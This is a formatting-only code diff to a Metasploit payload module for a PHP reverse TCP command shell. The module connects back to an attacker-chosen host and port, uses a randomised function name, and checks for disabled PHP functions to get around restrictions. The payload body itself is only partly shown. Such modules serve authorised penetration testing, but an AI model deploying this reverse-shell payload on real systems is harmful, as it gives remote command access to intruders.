@@ -3,9 +3,7 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 module MetasploitModule
-
   CachedSize = :dynamic
 
   include Msf::Payload::Single
@@ -13,22 +11,24 @@ module MetasploitModule
   include Msf::Sessions::CommandShellOptions
 
   def initialize(info = {})
-    super(merge_info(info,
-      'Name'          => 'PHP Command Shell, Reverse TCP (via PHP)',
-      'Description'   => 'Reverse PHP connect back shell with checks for disabled functions',
-      'Author'        => 'egypt',
-      'License'       => BSD_LICENSE,
-      'Platform'      => 'php',
-      'Arch'          => ARCH_PHP,
-      'Handler'       => Msf::Handler::ReverseTcp,
-      'Session'       => Msf::Sessions::CommandShell,
-      'PayloadType'   => 'cmd',
-      'Payload'       =>
-        {
-          'Offsets' => { },
+    super(
+      merge_info(
+        info,
+        'Name' => 'PHP Command Shell, Reverse TCP (via PHP)',
+        'Description' => 'Reverse PHP connect back shell with checks for disabled functions',
+        'Author' => 'egypt',
+        'License' => BSD_LICENSE,
+        'Platform' => 'php',
+        'Arch' => ARCH_PHP,
+        'Handler' => Msf::Handler::ReverseTcp,
+        'Session' => Msf::Sessions::CommandShell,
+        'PayloadType' => 'cmd',
+        'Payload' => {
+          'Offsets' => {},
           'Payload' => ''
         }
-      ))
+      )
+    )
   end
 
   #
@@ -39,7 +39,6 @@ module MetasploitModule
   #      circumvent safe mode.
   #
   def php_reverse_shell
-
     if (!datastore['LHOST'] or datastore['LHOST'].empty?)
       # datastore is empty on msfconsole startup
       ipaddr = '127.0.0.1'
@@ -48,7 +47,7 @@ module MetasploitModule
       ipaddr = datastore['LHOST']
       port = datastore['LPORT']
     end
-    exec_funcname = Rex::Text.rand_text_alpha(rand(10)+5)
+    exec_funcname = Rex::Text.rand_text_alpha(rand(10) + 5)
 
     uri = "tcp://#{ipaddr}"
     socket_family = "AF_INET"
@@ -58,7 +57,7 @@ module MetasploitModule
       socket_family = "AF_INET6"
     end
 
-    shell=<<-END_OF_PHP_CODE
+    shell = <<-END_OF_PHP_CODE
     #{php_preamble(disabled_varname: "$dis")}
     $ipaddr='#{ipaddr}';
     $port=#{port};
